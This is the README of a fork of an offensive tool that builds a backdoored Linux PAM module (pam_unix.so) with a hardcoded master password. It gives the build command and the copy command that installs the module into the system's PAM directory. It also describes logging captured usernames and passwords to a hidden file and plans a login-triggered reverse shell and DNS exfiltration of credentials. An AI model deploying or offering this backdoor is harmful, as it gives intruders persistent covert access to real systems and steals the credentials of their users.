# linux-pam-backdoor         
Linux PAM Backdoor           
```
       _           _     _ _                      _                          _
  ___ | |__    ___| |__ (_) |_   _   _ _ __    __| | ___   ___  _ __ ___  __| |
 / _ \| '_ \  / __| '_ \| | __| | | | | '__|  / _` |/ _ \ / _ \| '__/ _ \/ _` |
| (_) | | | | \__ \ | | | | |_  | |_| | |    | (_| | (_) | (_) | | |  __/ (_| |
 \___/|_| |_| |___/_| |_|_|\__|  \__,_|_|     \__,_|\___/ \___/|_|  \___|\__,_|

```
                             
This script automates the creation of a backdoor for Linux-PAM (Pluggable Authentication Modules)

## Usage
To generate the backdoored pam_unix.so, just run:
```
./backdoor.sh -v 1.3.0 -p som3_s3cr4t_p455w0rd
```

You have to identify the PAM version installed on the system, to make sure the script will compile the right version. Otherwise you can break the whole system authentication.

After the execution of the script, the last step is to copy the generated pam_unix.so to the pam modules dir on the host. 

```
cp pam_unix.so /usr/lib/security/
```

That's all. 

After that, you can log-in to the system using an existing user, and the previously configured password.

Use this for educational purposes only.
I am not responsible for the damage you might cause.


## Additional Features in this fork
Base64 Password String Encoding

Username:Password logging to /var/log/.rekt

Automatic Installer script


Planned features:

Reverse shell triggered on specific login sequence

DNS username:password exfil

Dockerized build system 

Direct binary patching to change password in compiled .so


## dev notes
just edit pam_unix_auth.c directly then run make_patch.sh then copy test.patch to backdoor.patch 
